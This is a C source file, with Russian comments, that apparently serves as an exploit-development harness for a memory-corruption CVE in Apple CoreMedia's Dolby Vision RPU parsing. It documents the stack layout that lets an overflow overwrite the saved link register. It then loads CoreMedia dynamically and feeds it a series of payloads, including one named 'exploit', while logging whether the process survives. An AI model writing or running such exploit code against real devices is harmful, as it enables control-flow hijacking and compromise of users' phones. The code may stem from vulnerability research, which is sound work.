// probe_cm4.c — CVE-2026-112688 через ПРАВИЛЬНЫЙ путь и с замером последствий.
//
// Статика (CoreMedia 24A446, _CMGetDMVersionLevelFromRPU @ 0x18efbf940):
//     stp x20,x19,[sp,#0x10]  /  stp x29,x30,[sp,#0x20]   ; сохранённые регистры
//     sub sp, sp, #0x7000
//     sub sp, sp, #0x3c0                                  ; кадр 0x73c0
//     add x0, sp, #0xc ; mov w1, #0x73b4 ; bl memset      ; структура sp+0xc..sp+0x73c0
//     bl _FigHEVCBridge_GetRPUMetadata(x1=bytes, x2=sp+0xc)
//
// ⇒ буфер кончается РОВНО на границе кадра, сразу за ним — x19/x20 и x29/x30.
// Значит переполнение массива A (запись на struct+0x73b4+n) затирает
// сохранённые регистры, включая LR. Это и есть примитив.
//
// ABI: функция принимает CFDataRef (1 аргумент) — проверено дизассемблером:
// x0 проверяется на NULL, затем CFDataGetBytePtr/CFDataGetLength.
// Вариант с 4 аргументами (bytes,len,*ver,*lvl) из референса — НЕВЕРЕН для iOS 27.
#include "rpu_payloads.h"

typedef unsigned long size_t;
typedef unsigned int u32;
typedef int i32;

extern int open(const char *, int, ...);
extern long write(int, const void *, size_t);
extern int close(int);
extern int unlink(const char *);
extern char *getenv(const char *);
extern void *dlopen(const char *path, int mode);
extern void *dlsym(void *h, const char *name);
extern int usleep(unsigned int usec);

#define RTLD_NOW 2
#define O_WRONLY 0x0001
#define O_CREAT  0x0200
#define O_TRUNC  0x0400

static int g_fd = -1;
static void log_str(const char *s) { long n = 0; while (s[n]) n++; if (g_fd >= 0) write(g_fd, s, (size_t)n); }
static void log_dec(long v) {
    char b[24]; int i = 23; b[i] = 0; int neg = v < 0;
    if (neg) v = -v;
    if (v == 0) b[--i] = '0';
    while (v > 0) { b[--i] = (char)('0' + (v % 10)); v /= 10; }
    if (neg) b[--i] = '-';
    log_str(&b[i]);
}

typedef const void *CFDataRef;
typedef CFDataRef (*cfcreate_t)(const void *, const unsigned char *, long);
typedef void (*cfrelease_t)(const void *);
typedef i32 (*rpu1_fn)(CFDataRef);

// «шум» на стеке: если LR/FP затрут, мы это увидим как расхождение
#define CANARY 0xC0FFEE1234567890ULL
static unsigned long long g_canary_before;
static unsigned long long g_canary_after;

static i32 call_payload(rpu1_fn fn, cfcreate_t mk, cfrelease_t rel,
                        const char *name, const unsigned char *p, unsigned int n) {
    CFDataRef d = mk(0, p, (long)n);
    log_str("cm4: -> "); log_str(name);
    log_str(" len="); log_dec((long)n);
    log_str(" cfdata="); log_dec(d != 0); log_str("\n");
    if (!d) return -1;
    i32 rc = fn(d);
    log_str("cm4: <- "); log_str(name);
    log_str(" rc="); log_dec(rc); log_str("\n");
    rel(d);
    return rc;
}

int main(void) {
    const char *home = getenv("HOME");
    char path[400]; int p = 0;
    if (home) { while (home[p] && p < 300) { path[p] = home[p]; p++; } }
    const char *sfx = "/Documents/probe_cm4.log";
    for (int i = 0; sfx[i] && p < 390; i++) path[p++] = sfx[i];
    path[p] = 0;
    unlink(path);
    g_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    log_str("cm4: start (CFDataRef ABI)\n");

    void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW);
    log_str("cm4: cf="); log_dec(cf != 0); log_str(" cm="); log_dec(cm != 0); log_str("\n");
    if (!cf || !cm) { log_str("cm4: frameworks missing\n"); close(g_fd); return 1; }

    cfcreate_t mk = (cfcreate_t)dlsym(cf, "CFDataCreate");
    cfrelease_t rel = (cfrelease_t)dlsym(cf, "CFRelease");
    rpu1_fn fn = (rpu1_fn)dlsym(cm, "CMGetDMVersionLevelFromRPU");
    log_str("cm4: syms mk="); log_dec(mk != 0);
    log_str(" rel="); log_dec(rel != 0);
    log_str(" fn="); log_dec(fn != 0); log_str("\n");
    if (!mk || !rel || !fn) { log_str("cm4: symbols missing\n"); close(g_fd); return 1; }

    g_canary_before = CANARY;
    call_payload(fn, mk, rel, "v1_oracle", rpu_v1_oracle, rpu_v1_oracle_len);
    log_str("cm4: canary_after_oracle="); log_dec(g_canary_before == CANARY); log_str("\n");

    // расширенная ветка: gate >= 0x13 -> записи +8..+0x16, должны достать x30
    log_str("cm4: about to smash via wide branch\n");
    call_payload(fn, mk, rel, "v1_wide", rpu_v1_wide, rpu_v1_wide_len);
    log_str("cm4: survived wide (branch not taken?)\n");

    // здесь ожидается smash сохранённых регистров -> падение на retab
    log_str("cm4: about to smash (exploit payload)\n");
    call_payload(fn, mk, rel, "v1_exploit", rpu_v1_exploit, rpu_v1_exploit_len);

    g_canary_after = CANARY;
    log_str("cm4: canary_after="); log_dec(g_canary_after == CANARY); log_str("\n");
    log_str("cm4: survived (no crash on return)\n");

    call_payload(fn, mk, rel, "probe6", rpu_probe6, rpu_probe6_len);
    log_str("cm4: done\n");
    close(g_fd);
    return 0;
}
